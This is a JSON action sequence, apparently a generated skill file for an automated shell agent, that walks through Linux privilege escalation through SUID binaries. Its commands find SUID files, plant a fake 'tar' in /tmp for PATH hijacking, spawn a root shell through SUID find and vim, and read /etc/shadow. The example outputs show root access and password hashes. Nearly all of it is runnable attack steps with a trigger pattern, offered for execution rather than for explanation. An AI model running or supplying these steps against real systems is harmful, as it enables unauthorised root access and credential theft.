{
  "name": "suid_binary_exploitation",
  "description": "Find and exploit SUID binaries for privilege escalation on Linux systems",
  "pattern": "suid.*exploit|find.*suid|setuid.*privilege|suid.*binary",
  "parameters": [
    "search_path"
  ],
  "sequence": [
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "find",
        "args": [
          "/",
          "-perm",
          "-4000",
          "-type",
          "f",
          "2>/dev/null"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/local/bin/backup\n/usr/sbin/pppd\n/bin/mount\n/bin/umount\n/bin/ping\n\nCustom SUID binary found: /usr/local/bin/backup (unusual location)\n\nTotal SUID binaries: 8"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "ls -la /usr/local/bin/backup && strings /usr/local/bin/backup | head -20"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "-rwsr-xr-x 1 root root 16384 Jan 15 10:30 /usr/local/bin/backup\n\nStrings analysis:\n/lib64/ld-linux-x86-64.so.2\nlibc.so.6\nsystem\n__libc_start_main\ntar -czf /tmp/backup.tar.gz /home/user/documents\n/bin/sh\nGLIBC_2.2.5\n\nVulnerability: Uses relative path 'tar' instead of absolute '/bin/tar'\nExploitable via PATH hijacking"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "echo '/bin/bash' > /tmp/tar && chmod +x /tmp/tar && PATH=/tmp:$PATH /usr/local/bin/backup"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Creating malicious 'tar' in /tmp\nModifying PATH to /tmp:...\nExecuting SUID binary /usr/local/bin/backup\n\nroot@victim:~# id\nuid=0(root) gid=0(root) groups=0(root)\n\nroot@victim:~# whoami\nroot\n\nPrivilege escalation successful - got root shell via SUID PATH hijacking"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "find / -perm -4000 -exec ls -la {} \\; 2>/dev/null | grep -E 'nmap|vim|find|python|perl|ruby'"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "-rwsr-xr-x 1 root root 234568 Dec 10 2023 /usr/bin/vim.basic\n-rwsr-xr-x 1 root root 138456 Nov 22 2023 /usr/bin/find\n\nDangerous SUID binaries found:\n  vim.basic - can execute shell commands\n  find - can execute commands with -exec\n\nExploit vim: /usr/bin/vim.basic -c ':!sh'\nExploit find: /usr/bin/find . -exec /bin/sh -p \\; -quit"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "/usr/bin/find . -exec /bin/sh -p \\; -quit"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Exploiting SUID find binary\n\n# id\nuid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)\n\n# whoami\nroot\n\n# cat /etc/shadow\nroot:$6$xyz123...:18965:0:99999:7:::\nadmin:$6$abc456...:18965:0:99999:7:::\n\nRoot access achieved via SUID find exploitation"
      }
    }
  ],
  "stats": {
    "uses": 0,
    "successes": 0,
    "failures": 0,
    "success_rate": 0.0
  },
  "created_by": "neural_mesh_v5.2_generator"
}
